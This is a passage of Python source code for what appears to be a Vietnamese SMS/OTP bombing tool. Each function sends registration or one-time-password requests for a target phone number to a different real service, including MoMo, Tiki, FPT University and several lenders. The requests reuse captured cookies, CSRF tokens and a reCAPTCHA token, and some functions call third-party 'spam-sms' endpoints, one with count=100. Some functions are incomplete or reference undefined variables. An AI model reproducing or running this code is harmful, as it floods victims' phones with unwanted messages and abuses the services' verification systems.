            "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
            "content-type: application/json",
            "authorization: Bearer " + token,
            "accept: */*",
            "origin: https://caydenthan.vn",
            "referer: https://caydenthan.vn/",
        ]
        get = json_decode(CURL("GET", "https://api.caydenthan.vn/api/user/phone-confirmation-code", None, head, false), true)
    else:
        data = '{"phone":"' + sdt + '"}'
        get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user/send-one-time-password", data, head, false), true)

def CAFELAND(sdt):
  head = {
    'Host': 'nhadat.cafeland.vn',
    'accept': 'application/json, text/javascript, /; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://nhadat.cafeland.vn',
    'referer': 'https://nhadat.cafeland.vn/dang-ky.html',
    'cookie': 'fbp=fb.1.1681635921620.1153873944;zi=2000.SSZzejyD6zyjZAYrmnPo2t9yFR9GbVGRvNYDTG5S9vX-sYtrDTZ7k4wA7VKrJ1UeBfxDjNLSLyXkJfCm.1;XSRF-TOKEN=eyJpdiI6ImlmZ2dwR3E3cmN6c0swa1lna0NOTXc9PSIsInZhbHVlIjoidG5NWWxOS1FxZTU0ZVFxekN4SmI1Z0VmVXQ5T2gwK1kxXC9HQTV6VFJDRVZ1U0haXC8yMldIYTdySERMS250aHdQIiwibWFjIjoiZGRlOTdhMjU5NGYyZGJkZDMzMmQxMTY2NDhkNDM2YjQ4M2JhMjI1YWRmYWYzZWViNDQ3ZmVlM2Y2NzNkMWM5MCJ9;laravelsession=eyJpdiI6IkJNSWdvektYKzJWMnZ1SGRzeTJpSVE9PSIsInZhbHVlIjoiYUY4dnlUbzI3bWhxK0Y5VkRIbXVwaWN3V3RLYmpZV04zemxib2krTEhRZTVPUlpraG40eE9Oa3Q5Q1wvMExrYmciLCJtYWMiOiJjNTNkMTNlMzIwZGIzNGZmNTY5MDQ5OGEzNTkzZGQ5MTlhMGE2NmVmMzM1ZTlkNzA3ZjRlMWFlNWQwNDg0Y2Y3In0%3D'
  }
  get = CURL("GET", "https://nhadat.cafeland.vn/dang-ky.html", None, head, False)
  token = get.split('name="token" value="')[1].split('"')[0]
  data = "mobile="+sdt+"&token="+token
  get = json.loads(CURL("POST", "https://nhadat.cafeland.vn/member-send-otp/", data, head, False))

def DAIHOCFPT(sdt):
  head = {
    "Host": "daihoc.fpt.edu.vn",
    "accept": "/",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://daihoc.fpt.edu.vn",
    "referer": "https://daihoc.fpt.edu.vn/tuyen-sinh-dh-fpt/"
  }
  data = "firstname=Khang&mobilephone="+sdt+"&email=tenhkhong3%40gmail.com&cityid=B%C3%ACnh+Ph%C6%B0%E1%BB%9Bc&ldpid=tuyen-sinh-dh-fpt&utmsource=&utmmedium=&utmcampaign=&utmterm=&urlreferer=&utmcpname=&utmadscampaign=&scripturi=https%3A%2F%2Fdaihoc.fpt.edu.vn%2Ftuyen-sinh-dh-fpt%2F&typeregister="
  get = CURL("POST", "https://daihoc.fpt.edu.vn/tstt/tuyen-sinh-dh-fpt/register.php", data, head, false)
  get = CURL("GET", "https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?mobile="+sdt+"&resendopt=1", None, head, False)                           
  
def ONCREDIT(sdt):
    headers = {
        "Host": "oncredit.vn",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://oncredit.vn",
        "referer": "https://oncredit.vn/registration",
        "cookie": "SN5c8116d5e6183=3tv1o7ton9n12jtnug96f8d8ut;OnCredit_id=643e0edf695496.07498174;fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=TGp96BSUW5IwMh0JgHeUd49rmhRq1triMmGzLzWzvCI=;GN_USER_ID_KEY=66bb4878-093a-4dfc-9f25-3ee94accd97a;GN_SESSION_ID_KEY=fd64cde4-6459-4ff0-8a68-7770bd9aa247",
    }

    session = requests.Session()
    session.get("https://oncredit.vn/registration", headers=headers)
    token = session.cookies.get("CSRFToken")

    data = {
        "data[typeData]": "sendCodeReg",
        "data[phone]": sdt,
        "data[email]": "khangksjjrf@gmail.com",
        "data[captcha1]": 1,
        "data[lang]": "vi",
        "CSRFName": "CSRFGuard_ajax",
        "CSRFToken": token,
    }
    response = session.post("https://oncredit.vn/?ajax", data=data, headers=headers)
    result = response.json()  
                                                       
def FINDO(sdt):
    headers = {
        "Host": "api.findo.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.findo.vn",
        "referer": "https://www.findo.vn/",
    }

    data = {"mobilePhone": {"number": sdt}}
    response = requests.post("https://api.findo.vn/web/public/client/phone/sms-code-ts", json=data, headers=headers)
    result = response.json()
  
def MONEYVEO(sdt):
    def generateRandomString(length):
        letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        return ''.join(random.choice(letters) for i in range(length))
    headers = {
        "Host": "moneyveo.vn",
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/",
    }
    
    headers = {
        "Host": "moneyveo.vn",
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generateRandomString(len("c771ff34b940c30df615b678478fce28")) + "-" + generateRandomString(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneyveo.vn/vi/registernew/",
        "cookie": ck,
    }
    
    response = requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/", data=data, headers=headers)
    access = json.loads(response.text)

def VAYVND(sdt):
    head = [
        "Host: api.vayvnd.vn",
        "accept: application/json",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "origin: https://vayvnd.vn",
        "referer: https://vayvnd.vn/",
    ]
    data = '''
    {
        "phone": "'''+sdt+'''",
        "utm_campaign": "null",
        "cpa_id": 7,
        "cpa_lead_data": {
            "click_id": "'''+generateImei()+'''",
            "source_id": "source_6",
            "utm_score": "0.0'''+generateRandomstr(len("13672266155481339"))+'''"
        },
        "utm_list": [
            {
            "utm_source": "jeffapp"
            }
        ],
        "source_site": 1,
        "reg_screen_resolution": {
            "width": 412,
            "height": 915
        }
    }'''
    GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", data, head, False))
    if GET["data"]["id"]:
        return {"VAYVND": "Thành Công"}
    else:
        data = '''
        {
            "login": "'''+sdt+'''"
        }'''
        GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users/password-reset", data, head, False))

def LOSHIP(sdt):
    a = "84" + sdt
    usersdt = a.split("840")[1]
    head = {
        "Host": "latte.lozi.vn",
        "accept-language": "vi_VN",
        "x-access-token": "unknown",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://loship.vn",
        "referer": "https://loship.vn/",
    }
    data = '{"device":"Android 12","platform":"Chrome WebView/96.0.4664.104","countryCode":"84","phoneNumber":"' + sdt + '"}'
    response = requests.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", data=data, headers=head)

def TUOITRE(sdt):
    url = "https://tuoitre.vn"  # Replace with the correct URL
    headers = {
        "Host": "tuoitre.vn",
        "accept": "application/json, text/plain, */*",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
        "origin": "https://sso.tuoitre.vn",
        "cookie": "_ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselh"
        
    }         
    
def DONGPLUS(sdt):
    sdt = "84" + sdt
    sdt = sdt.split("840")[1]    
    head = [
        "Host: api.dongplus.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://dongplus.vn",
        "referer: https://dongplusvn/user/login"
    ]
    
    data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84' + sdt + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
    
    CURL("POST", "https://api.dongplus.vn/api/user", data, head, False)
    
    data = '{"phone":"84' + sdt + '"}'
    
    access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", data, head, False)

def F88(sdt):
    headers = {
        "Host": "api.f88.vn",
        "accept": "application/json, text/plain, */*",
        "content-encoding": "gzip",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://online.f88.vn",
        "referer": "https://online.f88.vn/",
    }
    data = {
        "phoneNumber": sdt,
        "recaptchaResponse": "03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO",
        "source": "Online"
    }
    response = requests.post("https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", json=data, headers=headers)


def TIENOI(sdt):
    headers = {
        "Host": "app.tienoi.com.vn",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://app.tienoi.com.vn",
        "referer": "https://app.tienoi.com.vn/auth/registration?need=2000000&days=14",
    }
    data = {
        "mobilePhone": sdt,
        "password": "A123456789a",
        "passwordConfirmation": "A123456789a",
        "isVoiceSms": True
    }
    response = requests.post("https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode", json=data, headers=headers)

def VIETTELL(sdt):
    head = {
        "Host": "vietteltelecom.vn",
        "Connection": "keep-alive",
        "X-CSRF-TOKEN": "mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, /",
        "Referer": "https://vietteltelecom.vn/dang-nhap",
    }
    data = {
        "phone": sdt,
        "type": ""
    }
    GET = json(CURL("POST", "https://vietteltelecom.vn/api/get-otp-login", json.dumps(data), head, False))

def META(sdt):
    head = {
        "Host": "meta.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://meta.vn",
        "referer": "https://meta.vn/account/register",
        "cookie": "ssid=smfszyszu3tq5h02lmly12yz;cart=fc5bf0de-45de-4323-a007-f7860e71a5a1;ckmid=262a67477e774f56b3de7e656e741682"
    }
    data = '{"apiargs":{"lgUser":"' + sdt + '","act":"send","type":"phone"},"apimethod":"CheckExist"}'
    GET = json(CURL("POST", "https://meta.vn/appscripts/pages/AccountReact.aspx?apimode=1", data, head, False))

def TAMO(sdt):
    head = {
        "Host": "api.tamo.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.tamo.vn",
        "referer": "https://www.tamo.vn/",
    }
    data = '{"mobilePhone":{"number":"' + sdt + '"}}'
    access = json(CURL("POST", "https://api.tamo.vn/web/public/client/phone/sms-code-ts", data, head, False))

def MOMO(sdt):
     head = [
         "agentid: undefined",
         "sessionkey:",
         "userphone: undefined",
         "authorization: Bearer undefined",
         "msgtype: CHECKUSERBEMSG",
         "Host: api.momo.vn",
         "User-Agent: okhttp/4.0.12",
         "appversion: 40122",
         "appcode: 4.0.12",
         "deviceos: ANDROID"
     ]
     data = {
         'user': sdt,
         'msgType': 'CHECKUSERBEMSG',
         'cmdId': str(microtime) + '000000',
         'lang': 'vi',
         'time': microtime,
         'channel': 'APP',
         'appVer': '40122',
         'appCode': '4.0.12',
         'deviceOS': 'ANDROID',
         'buildNumber': 0,
         'appId': 'vn.momo.platform',
         'result': True,
         'errorCode': 0,
         'errorDesc': '',
         'momoMsg': 
         {
             'class': 'mservice.backend.entity.msg.RegDeviceMsg',
             'number': sdt,
             'imei': imei,
             'cname': 'Vietnam',
             'ccode': '084',
             'device': "Oppo realme X Lite",
             'firmware': '23',
             'hardware': "RMX1851CN",
             'manufacture': "Oppo",
             'csp': '',
             'icc': '',
             'mcc': '452',
             'deviceos': 'Android',
             'secureid': sec,
         },
         'extra': {
             'checkSum': '',
         },
     }
     GET = json(CURL("POST", "https://api.momo.vn/backend/otp-app/public/", json.dumps(data), head, False))

def apiv3(phone):
    cookies = {
        '_ga': 'GA1.1.355569834.1685331326',
        '_hp2_ses_props.758475466': '%7B%22ts%22%3A1685616159432%2C%22d%22%3A%22onlytrislua.x10.mx%22%2C%22h%22%3A%22%2F%22%7D',
        '_hp2_id.758475466': '%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%225407290981034883%22%2C%22sessionId%22%3A%22627390060443876%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
        '_ga_LKETQQ110J': 'GS1.1.1685616159.3.1.1685616694.0.0.0',
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'onlytrislua.x10.mx',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_ga=GA1.1.355569834.1685331326; _hp2_ses_props.758475466=%7B%22ts%22%3A1685616159432%2C%22d%22%3A%22onlytrislua.x10.mx%22%2C%22h%22%3A%22%2F%22%7D; _hp2_id.758475466=%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%225407290981034883%22%2C%22sessionId%22%3A%22627390060443876%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_LKETQQ110J=GS1.1.1685616159.3.1.1685616694.0.0.0; serverChoice=Server-IPv2',
        'origin': 'https://onlytrislua.x10.mx',
        'referer': 'https://onlytrislua.x10.mx/download/user-vip-spam-sms.php',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    data = {
        'phone': phone,
        'ten_server': 'Server-IPv2',
        'key': 'TRTS',
    }

    requests.post('https://onlytrislua.x10.mx/download/user-vip-spam-sms.php', cookies=cookies, headers=headers, data=data)

def apiv2(phone):
    cookies = {
        '_ga': 'GA1.1.355569834.1685331326',
        '_hp2_id.758475466': '%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%228770872279147596%22%2C%22sessionId%22%3A%227025862886191853%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
        '_ga_LKETQQ110J': 'GS1.1.1685331326.1.1.1685331343.0.0.0',
    }

    headers = {
        'authority': 'onlytrislua.x10.mx',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_ga=GA1.1.355569834.1685331326; _hp2_id.758475466=%7B%22userId%22%3A%222150082854199568%22%2C%22pageviewId%22%3A%228770872279147596%22%2C%22sessionId%22%3A%227025862886191853%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga_LKETQQ110J=GS1.1.1685331326.1.1.1685331343.0.0.0',
        'origin': 'https://onlytrislua.x10.mx',
        'referer': 'https://onlytrislua.x10.mx/s/user-spam-sms.php',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    data = {
        'phone': phone,
        'server_id': '493',
        'key': 'TRTS',
    }

    response = requests.post('https://onlytrislua.x10.mx/s/user-spam-sms.php', cookies=cookies, headers=headers, data=data)

def tgdd(phone):
    cookies = {
        'DMX_Personal': '%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE',
        '_gid': 'GA1.2.2106570071.1685151972',
        '_ga_TLRZMSX5ME': 'GS1.1.1685151972.1.0.1685151972.60.0.0',
        '_ga': 'GA1.1.2004811826.1685151972',
        '_fbp': 'fb.1.1685151972814.1550382232',
        'cebs': '1',
        '_ce.s': 'v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940',
        '_ce.clock_event': '1',
        'SvID': 'beline2686|ZHFg6|ZHFg5',
        '_ce.clock_data': '-113%2C14.225.211.123%2C1',
        'cebsp_': '1',
        '_tt_enable_cookie': '1',
        '_ttp': '5MoF_IoMgcKATLRi4lIvjOVPQrd',
        'lhc_per': 'vid|eadd7b088636140f774e',
    }

    headers = {
        'authority': 'www.thegioididong.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'DMX_Personal=%7B%22UID%22%3A%2202a2125eae4752c091831644559197e73c7d03c7%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8OWsBjKS6DlGsrtmU_sYztKa6jv4_yE6DtGOKVnXzsN6QtnTcJHOshhJAjy60o2M8G7nlhVDVpVJq5TrlHeeRcwJjejgiIZpN-iBvlNqnf1tRwxng2G6uuWHF9XpCpNPf5yKVSW_11B4iUgzW4n4SgE; _gid=GA1.2.2106570071.1685151972; _ga_TLRZMSX5ME=GS1.1.1685151972.1.0.1685151972.60.0.0; _ga=GA1.1.2004811826.1685151972; _fbp=fb.1.1685151972814.1550382232; cebs=1; _ce.s=v~23af4964fee97034df50d8ac200f8c95b4ea3899~lcw~1685151972938~vpv~0~lcw~1685151972940; _ce.clock_event=1; SvID=beline2686|ZHFg6|ZHFg5; _ce.clock_data=-113%2C14.225.211.123%2C1; cebsp_=1; _tt_enable_cookie=1; _ttp=5MoF_IoMgcKATLRi4lIvjOVPQrd; lhc_per=vid|eadd7b088636140f774e',
        'origin': 'https://www.thegioididong.com',
        'referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8OWsBjKS6DlGsrtmU_sYztIFV_sLQ8iWp7L2ZHjo3-UAquJc6mF7IflJ21rflzBVCTfkVYuNcBYuDIdaZroeLkecOCkjg8RcsK0QvNDv6_w7iP7JTCGaGgWZ4Ybwep7Zt6N6vP8-qJcVUHhSPvjvh_s',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
  
def apiv5(phone):
    url = "https://api.huykaiser.me/API/AUTOSPAM/spam?count=100&phone={}".format(phone)
    requests.post(url)

def tiki(phone):
    response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=ua, json=jsdt).text
###
def moca(phone):
    home = requests.get('https://moca.vn/moca/v2/users/role', params=paramss, headers=headerss).json()
    token = home['data']['registrationId']
    response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headerss).json()
def gbay(phone):
    json_data = {'phone_number': phone,'hash': random_string(40),}
    requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()

def vieon1(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": 